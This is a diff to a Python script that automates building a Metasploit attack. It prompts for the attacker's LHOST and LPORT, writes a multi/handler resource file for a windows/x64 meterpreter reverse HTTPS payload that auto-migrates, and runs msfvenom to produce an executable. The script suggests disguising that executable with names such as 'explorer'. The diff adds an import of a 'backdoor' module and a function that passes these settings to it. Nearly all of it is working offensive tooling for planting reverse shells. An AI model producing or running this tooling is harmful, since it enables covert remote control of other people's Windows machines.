@@ -1,6 +1,6 @@
-import os
 import subprocess
 import urllib.request
+import backdoor
 
 ascii_art = r"""
   ad8888ba,                                      ad8888ba,   ad8888ba, 
@@ -20,6 +20,8 @@ d8                                             d8          d8
                 `8, ,8I                                                
                  `Y8P"                                                 
 """
+
+
 def detect_ip():
     try:
         with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
@@ -34,6 +36,7 @@ def get_user_ip():
     print(f"Your public IP is: {current_ip}")
     while True:
         public_ip_question = input("Do you want to use it ? (Yes/No) ").strip().lower()
+
         if public_ip_question in ["y","Yes","yes"]:
             print(f"Chosen IP: {current_ip}")
             return current_ip
@@ -43,19 +46,34 @@ def get_user_ip():
             return user_given_ip
         else:
              print("Please specify only yes or no.")
+
 def get_user_target(lhost):
     while True:
         host_port = input("Enter your LPORT: ").strip()
         if host_port.isdigit():
             break
         print("You must specify your LPORT as numbers.")
+
     payload_name = input("Enter your payload name(For example: explorer):\n")
+
     print(f"Setting LHOST to {lhost}")
+
     print(f"Setting LPORT to {host_port}")
+
     print(f"Setting payload name to: {payload_name}.exe")
-    return host_port , payload_name
+
+    return int(host_port), payload_name
+
+
+def user_info():
+    # To send info to backdoor.py
+    ip = get_user_ip()
+    port, payload = get_user_target(ip)
+    return ip, port, payload
+
 def metasploit_handler(lhost,lport):
     print("Creating a handler file for Metasploit...")
+
     metasploit_content = f"""
     use exploit/multi/handler
     set PAYLOAD windows/x64/meterpreter_reverse_https
@@ -66,9 +84,12 @@ def metasploit_handler(lhost,lport):
     set AutoRunScript post/windows/manage/migrate
     exploit -j -z
     """
+
     with open("handler.rc","w") as f:
         f.write(metasploit_content)
     print("Successfully created a handler.rc file!")
+
+
 def generate_payload(lhost, lport, payload_name):
     try:
         print("Generating payload...")
@@ -88,6 +109,7 @@ def generate_payload(lhost, lport, payload_name):
         else:
             print(f"Error generating payload: {result.stderr}")
             return False
+
     except FileNotFoundError:
         print("msfvenom not found. Please make sure Metasploit Framework is installed and in PATH.")
         print("You can install it with: sudo apt install metasploit-framework")
@@ -112,8 +134,11 @@ def main():
         print(f"   set LHOST {lhost}")
         print(f"   set LPORT {lport}")
         print("   exploit -j -z")
+
     else:
         print("Failed to generate payload.")
+
+
 if __name__ == "__main__":
     main()
 
